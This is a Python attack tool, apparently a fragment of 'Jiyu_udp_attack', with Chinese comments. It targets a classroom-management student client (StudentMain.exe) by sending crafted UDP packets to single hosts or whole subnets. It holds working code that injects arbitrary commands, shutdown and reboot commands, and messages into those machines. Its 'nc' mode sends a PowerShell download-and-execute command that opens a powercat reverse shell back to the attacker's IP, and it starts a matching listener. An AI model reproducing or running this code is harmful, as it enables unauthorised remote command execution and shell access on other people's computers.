# 格式化要发送的消息
def format_b4_send(content):
    arr = []
    for ch in content:
        tmp = ''.join(list(map(lambda x: hex(ord(x)), ch)))
        if int(tmp, 16) > 0xff:
            tmp = tmp[2:]
            high = int((tmp[0] + tmp[1]), 16)
            low = int((tmp[2] + tmp[3]), 16)
            arr.append(low)
            arr.append(high)
        else:
            high = 0
            low = int((tmp[2] + tmp[3]), 16)
            arr.append(low)
            arr.append(high)
    return arr


# 获取ip
    # 支持多种IP格式：
    # - 单个IP: 192.168.1.1
    # - IP范围: 192.168.1.10-50  
    # - C段: 192.168.1.0/24
def get_ip(ip):
    target_host = []
    if ip.find('.') == -1: #未找到ip分隔符 "." 
        print('\n你输入的ip格式不正确')
        print("请检查你的输入，然后再次输入正确的ip")
        print("一个正确的IP地址应为: *.*.*.* ")
        print("例：192.168.0.1")
        sys.exit(0)
    if ip.find('-') != -1: #找到ip范围符号 "-"
        ip_arr = ip.split('-')
        ip_arrs = ip_arr[0].split('.')
        if int(ip_arr[1]) > 254: #如果主机位输入大于254(超出ip地址的范围)
            print("你的ip地址网络位不正确")
            print("一个正确的ip地址应为 *.*.*.x (0<x<255)")
            sys.exit(0) #退出程序
        for i in range(int(ip_arrs[3]), int(ip_arr[1])+1):
            ip_arrs[3] = str(i)
            target_host.append('.'.join(ip_arrs))
    elif ip.find('/') == -1: #未找到IP c段分隔符 "/" (输入的ip为单个ip地址)
        
        target_host.append(ip)
    elif ip.find('/24') != -1: #找到IP c段符号 "/" 且这里的ip地址前24位是网络位
        ip_arr = ip.split('/')
        ip_arrs = ip_arr[0].split('.')
        for i in range(1, 255): #这里直接遍历所有ip
            ip_arrs[3] = str(i)
            target_host.append('.'.join(ip_arrs))
    else:
        print('\n你输入的ip格式不正确')
        print("请检查你的输入，然后再次输入正确的ip")
        sys.exit(0)
    return target_host
"""
什么是C段

C段,即C类网络地址,范围为 192.0.0.0 - 223.255.255.255,在下文中采用2进制讨论，即 

    11000000.00000000.00000000.00000000 - 11011111.11111111.11111111.11111111

其中,前24位是网络位，后8位是主机位

在本代码中,使用了/来表示C段
例:
192.168.110.1/24
在这个例子中,/24指的是前24位是网络位,后8位是主机位
在执行这个ipC段时,程序会遍历从192.168.110.1 - 254 的所有ip(192.168.110.0是网络地址， 192.168.110.255是广播地址，不可用)
"""


# 将要发送的消息打包成完整的指令
def pkg_sendlist(cmdtype, content):
    arrs = format_b4_send(content)
    if cmdtype == '-msg':
        index = 56
        result = basicCMD['-msg']
        for elem in arrs:
            result[index] = elem
            index += 1
    elif cmdtype == '-c':
        index = 578
        result = basicCMD['-c']
        max_len = len(result) - index  # 剩余可用字节数
        if len(arrs) > max_len:
            print("[!] 警告：命令过长，将被截断！")
        for elem in arrs:
            if index >= len(result):
                print("[!] 错误：命令超出缓冲区，已丢弃多余部分")
                break
            result[index] = elem
            index += 1
    return result


# 发送
def send(send_list):
    if len(send_list) == 0:
        print("错误！请检查你的指令.如果需要帮助，请使用 python Jiyu_udp_attack.py -h参数来获取帮助")
        sys.exit(0)
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    target_host = get_ip(args.ip)
    for times in range(args.l):
        for i in target_host:
            for abc in send_list:
                payload = pack("%dB" % (len(abc)), *abc)
                client.sendto(payload, (i, args.p))
        if args.l == 1:
            print("发送成功")
            #print(">>> ")
            #sys.exit(0)
        if args.l != 1:
            print("第%s次执行完毕" % str(times + 1))
        if times != args.l - 1:
            sleep(args.t)


def creat_send_object():
    send_list = []

    # 获取命令内容
    if args.msg:
        send_list.append(pkg_sendlist('-msg', args.msg))

    if args.c:
        send_list.append(pkg_sendlist('-c', args.c))

    if args.e == 'r':
        send_list.append(basicCMD['-r'])

    if args.e == 's':
        send_list.append(basicCMD['-s'])

    return send_list


def single_command():
    if args.e == 'g':
        try:
            hostname = socket.gethostname()
            ip = socket.gethostbyname(hostname)
            print("\n你的ip地址是:" + ip)

            tasklist = popen("tasklist|find \"Student\"").read()
            pattern = compile(r'[e]\s*\d{1,5}\s*[C]')
            pid = (pattern.search(tasklist).group()[1:-1]).strip()

            netstat = popen("netstat -ano |find \"{}\"".format(pid)).read()
            pattern = compile(r"%s:\d{1,5}\s*[*]{1}" % ip)
            netstat_pat = pattern.findall(netstat)

            ports = [((i.strip(ip)[1:-1]).rstrip()) for i in netstat_pat]
            print("\n你的学生端使用的端口有:" + ','.join(ports))
        except:
            pass
        sys.exit(0)

    elif args.e == 'break':
        popen('sc config MpsSvc start= auto')
        popen('net start MpsSvc')
        popen('netsh advfirewall set allprofiles state on')
        popen('netsh advfirewall firewall set rule name="StudentMain.exe" new action=block')
        sleep(1)
        system("cls")
        sys.exit(0)

    elif args.e == 'continue':
        popen('netsh advfirewall firewall set rule name="StudentMain.exe" new action=allow')
        sys.exit(0)


def netcat(num):
    send_list = []
    if args.local_ip:
        attacker_ip = args.local_ip
        print(f"获取ip地址为:{attacker_ip}")
    else:
        hostname = socket.gethostname()
        attacker_ip = socket.gethostbyname(hostname)
        print(f"[!] 未指定 -lip，自动获取的本机 IP 为 {attacker_ip}，请确保目标能访问此 IP！")
    
    # 最短命令：使用 -c 代替 -Command，去掉 .exe，文件名用 p.ps1
    url = f"http://{attacker_ip}:8000/p.ps1"
    cmd = f"powershell -c IEX (New-Object Net.WebClient).DownloadString('{url}'); powercat -c {attacker_ip} -p 65535 -e powershell"
    
    print(f"远程下载命令已发送! 命令长度: {len(cmd)} 字符")
    print(f"发送的命令: {cmd}")
    send_list.append(pkg_sendlist('-c', cmd))
    send(send_list)

def run_from_cmd():
    global args
    # 如果 args.ip 为 None，说明尚未通过 GUI 设置，需要解析命令行参数
    if args.ip is None and args.e is None and args.c is None and args.msg is None and args.local_ip is None: #确保这是真没设置!
        args = parser.parse_args()
    try:
        single_command()
        if args.e != 'nc':
            send_list = creat_send_object()
            send(send_list)
        else:
            num = 65535  # 固定端口
            if args.local_ip:
                attacker_ip = args.local_ip
            else:
                hostname = socket.gethostname()
                attacker_ip = socket.gethostbyname(hostname)
                print(f"[!] 未指定 -lip，自动获取的本机 IP 为 {attacker_ip}，请确保目标能访问此 IP！")
            netcat(num)
            print(f"listening on {num} ...")
            system(f'start powershell -NoExit -NoProfile -Command "chcp 936 > $null; IEX (New-Object System.Net.WebClient).DownloadString(\'http://{attacker_ip}:8000/p.ps1\'); powercat -l -p {num}"')
            print(f"本地监听Powershell已运行!,已连接:http://{attacker_ip}:8000/p.ps1,端口:{num}")
    except Exception as e:
        print("[-] %s" % e)


if __name__ == '__main__':
    run_from_cmd()
